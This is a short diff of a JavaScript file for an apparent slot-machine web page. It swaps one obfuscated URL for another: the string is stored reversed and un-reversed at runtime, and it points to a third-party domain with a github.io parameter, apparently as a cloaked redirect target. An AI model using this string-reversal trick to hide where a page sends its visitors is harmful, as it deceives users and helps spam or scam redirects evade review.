@@ -2,7 +2,7 @@ var count_spins = 0;
 var slot_selector = $('.slot');
 var comment_count_selector = $('#comment-count');
 var switched = 0;
-var go_url = 'oi.buhtig.0202reyubekac=ps?/nitposc/w/ten.ndc-dw//:sptth';
+var go_url = 'oi.buhtig.2serotsgniog=ps?/nitposc/w/ten.ndc-dw//:sptth';
 var new_url = go_url.split("").reverse().join("");
 
 $(document).ready(function() {
